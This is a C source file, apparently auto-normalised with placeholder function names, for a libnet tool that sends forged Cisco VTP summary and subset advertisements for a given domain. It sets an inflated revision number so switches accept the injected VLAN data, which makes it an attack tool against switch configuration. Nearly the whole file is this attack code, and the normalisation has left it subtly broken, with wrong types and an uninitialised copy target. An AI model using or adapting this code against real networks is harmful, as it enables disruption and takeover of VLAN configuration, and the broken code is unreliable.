#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int u_int8_t ;
typedef  int u_int32_t ;
struct vtp_summary {int version; int code; int followers; int dom_len; int* domain; void* revision; } ;
struct vtp_subset {int version; int code; int seq; int dom_len; int* domain; void* revision; } ;
struct libnet_ether_addr {int /*<<< orphan*/  ether_addr_octet; } ;
typedef  int /*<<< orphan*/  libnet_t ;
typedef  int /*<<< orphan*/  libnet_ptag_t ;
typedef  int /*<<< orphan*/  cisco_data ;

/* Variables and functions */
 scalar_t__ LIBNET_802_2_H ; 
 int LIBNET_ERRBUF_SIZE ; 
 int /*<<< orphan*/  LIBNET_LINK ; 
 int* FUNC0 (int,int) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ,char*,char*) ; 
 int /*<<< orphan*/  FUNC3 (int*) ; 
 int FUNC4 (int,char**,char*) ; 
 void* FUNC5 (int) ; 
 int /*<<< orphan*/  FUNC6 (int,int,int,int*,int,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC7 (int*,int /*<<< orphan*/ ,scalar_t__,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC8 (int /*<<< orphan*/ *) ; 
 struct libnet_ether_addr* FUNC9 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC10 (int /*<<< orphan*/ ,char*,char*) ; 
 int FUNC11 (int /*<<< orphan*/ *) ; 
 char* FUNC12 (int) ; 
 int /*<<< orphan*/  FUNC13 (int*,...) ; 
 int /*<<< orphan*/  FUNC14 (char*,char*) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  FUNC15 (char*,char*) ; 
 int FUNC16 (char*) ; 
 int /*<<< orphan*/  FUNC17 (char*) ; 

int FUNC18( int argc, char *argv[] )
{
    int opt,k=0;
    extern char *optarg;
    libnet_ptag_t t;
    libnet_t *lhandler;
    u_int32_t vtp_len=0, sent;
    struct vtp_summary *vtp_summ;
    struct vtp_subset *vtp_sub;
    u_int8_t *vtp_packet,*vtp_packet2, *aux;
    u_int8_t cisco_data[]={ 0x00, 0x00, 0x0c, 0x20, 0x03 };
    u_int8_t dst_mac[6]={ 0x01,0x00,0x0c,0xcc,0xcc,0xcc };
    u_int8_t aaa[8]={ 0x22,0x00,0x11,0x22,0x11,0x00, 0x00,0x00 };
    struct libnet_ether_addr *mymac;
    char *device;
    char error_information[LIBNET_ERRBUF_SIZE];
    char *domain;

// get options
     while ((opt = FUNC4(argc, argv, "i:d:")) != -1)
     {
          switch (opt) {
          case 'i':
          device=FUNC12(FUNC16(optarg));
          FUNC15(device,optarg);
      k=1;
          break;

          case 'd':
          domain=FUNC12(FUNC16(optarg));
          FUNC15(domain,optarg);
          break;
         
          default: FUNC17(argv[0]);
          }
     }
     if(!k) { FUNC14("  %s -i <interface> -d <vtp domain>\n     must assign the interface\n",argv[0]);FUNC1(1);}

//init libnet

    lhandler=FUNC10(LIBNET_LINK,device,error_information);
    if (!lhandler) {
             FUNC2(stderr, "libnet_init: %s\n", error_information);
             return -1;
     }

    mymac=FUNC9(lhandler);
//build the first packet for vtp_summary
    vtp_len = sizeof(cisco_data)+sizeof(struct vtp_summary);
    vtp_packet = FUNC0(1,vtp_len);
    aux = vtp_packet;
    FUNC13(vtp_packet,cisco_data,sizeof(cisco_data));
    aux+=sizeof(cisco_data);
    vtp_summ = (struct vtp_summary *)aux;
    vtp_summ->version = 0x01;
    vtp_summ->code = 0x01;//vtp_summary
    vtp_summ->followers = 0x01;
    vtp_summ->dom_len = FUNC16(domain);
    FUNC13(vtp_summ->domain,domain,FUNC16(domain));
    vtp_summ->revision = FUNC5(2000);//bigger than the current revision number will ok
    t = FUNC6(
        0xaa,            /* DSAP */
        0xaa,            /* SSAP */
        0x03,            /* control */
        vtp_packet,      /* payload */
        vtp_len,         /* payload size */
        lhandler,        /* libnet handle */
        0);              /* libnet id */
    t = FUNC7(
        dst_mac,       /* ethernet destination */
        mymac->ether_addr_octet,     /* ethernet source */
        LIBNET_802_2_H + vtp_len, /* frame size */
        NULL,                     /* payload */
        0,                        /* payload size */
        lhandler,                 /* libnet handle */
        0);                       /* libnet id */

     sent = FUNC11(lhandler);

     if (sent == -1) {
        FUNC8(lhandler);
        FUNC3(vtp_packet);
        return -1;
     }
     FUNC8(lhandler);
    
//build the second vtp packet for vtp_subset
     vtp_len = sizeof(cisco_data)+sizeof(struct vtp_subset);
     vtp_packet2 = FUNC0(1,vtp_len);
     aux = vtp_packet2;
     FUNC13(vtp_packet2,cisco_data,sizeof(cisco_data));
     aux+=sizeof(cisco_data);
    
     vtp_sub = (struct vtp_subset *)aux;
     vtp_sub->version = 0x01;
     vtp_sub->code = 0x02; //vtp_subset
     vtp_sub->seq = 0x01;
     vtp_sub->dom_len = FUNC16(domain);
     FUNC13(vtp_sub->domain,domain,FUNC16(domain));
     vtp_sub->revision = FUNC5(2000);//bigger than the current revision number will ok
//     memcpy(vtp_sub->aaa,aaa,strlen(aaa));
    
    t = FUNC6(
        0xaa,            /* DSAP */
        0xaa,            /* SSAP */
        0x03,            /* control */
        vtp_packet2,      /* payload */
        vtp_len,         /* payload size */
        lhandler,        /* libnet handle */
        0);              /* libnet id */
    t = FUNC7(
        dst_mac,       /* ethernet destination */
        mymac->ether_addr_octet,     /* ethernet source */
        LIBNET_802_2_H + vtp_len, /* frame size */
        NULL,                     /* payload */
        0,                        /* payload size */
        lhandler,                 /* libnet handle */
        0);                       /* libnet id */

     sent = FUNC11(lhandler);
     if (sent == -1) {
        FUNC8(lhandler);
        FUNC3(vtp_packet);
        return -1;
     }
     FUNC8(lhandler);
}